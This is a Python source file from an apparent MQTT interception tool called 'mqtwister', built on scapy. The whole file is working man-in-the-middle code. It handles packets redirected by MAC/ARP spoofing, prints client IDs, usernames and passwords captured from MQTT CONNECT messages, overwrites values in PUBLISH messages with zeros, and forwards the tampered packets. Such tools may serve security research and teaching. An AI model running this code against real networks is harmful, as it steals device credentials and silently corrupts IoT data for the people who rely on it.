# SPDX-FileCopyrightText: 2025 Daniel Feito-Pin <danielfeitopin+github@protonmail.com>
#
# SPDX-License-Identifier: GPL-2.0-only

from scapy.all import Packet, sendp
from scapy.contrib.mqtt import MQTT, MQTTConnect, MQTTPublish
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP

from mqtwister.utils.network import get_arp_table
from mqtwister.config import MQTT_PORT
from mqtwister.processor.packet import get_layers, reassemble_packet, recalculate_values
from mqtwister.processor.tampering import (
    alter_MQTTPublish_packet,
    value_to_zero,
    value_to_zeros
)


def process_MQTTConnect(packet: MQTT) -> None:

    # Get MQTT message layers
    connect: MQTTConnect = packet[MQTTConnect]
    client_id: bytes = connect.clientId
    username: bytes | None = connect.username
    password: bytes | None = connect.password

    # Detect credentials
    if client_id != b'' or username is not None or password is not None:

        client_id: str = client_id.decode()
        username: str = username.decode() if username is not None else ''
        password: str = password.decode() if password is not None else ''
        msg: str = 'Credentials found!\n'
        msg += f"Client ID: '{client_id}', "
        msg += f"Username: '{username}', "
        msg += f"Pasword: '{password}'"
        print(msg)

    return None


def process_MQTTPublish(packet: MQTT) -> None:

    # Get MQTT message layers
    layers: list[Packet] = get_layers(packet[MQTT])

    # print(f"Layers ({len(layers)}): {layers}")

    for layer in layers:
        if type(layer) == MQTTPublish:
            alter_MQTTPublish_packet(layer, value_to_zeros)

    # Reassemble MQTT message layers
    packet[MQTT] = reassemble_packet(layers)

    # Recalculate lengths and checksums
    del packet[MQTT].len
    recalculate_values(packet)

    return None


def packet_callback(packet: Packet, context: dict) -> None:

    # Don't process not TCP packets
    if not packet.haslayer(TCP):
        return None

    # Don't process packets sent by the own host
    if packet[Ether].src == context['lmac']:
        return None

    # Only process MQTT or MQTT-related TCP packets
    if packet[TCP].sport == MQTT_PORT or packet[TCP].dport == MQTT_PORT:
        msg: str = f"[{'='*20}Received MQTT packet.{'='*20}]\n"
        msg += f"FROM: "
        msg += f"{packet[Ether].src}/{packet[IP].src}/{packet[TCP].sport}\n"
        msg += f"TO: "
        msg += f"{packet[Ether].dst}/{packet[IP].dst}/{packet[TCP].dport}\n"
        print(msg)
    else:
        return None

    # Revert MAC spoofing
    packet[Ether].src = context['lmac']
    packet[Ether].dst = get_arp_table().get(packet[IP].dst)

    if packet.haslayer(MQTTConnect):
        # packet.show()
        process_MQTTConnect(packet)
    elif packet.haslayer(MQTTPublish):
        # packet.show()
        process_MQTTPublish(packet)

    # packet.show2()

    sendp(packet)
    return None
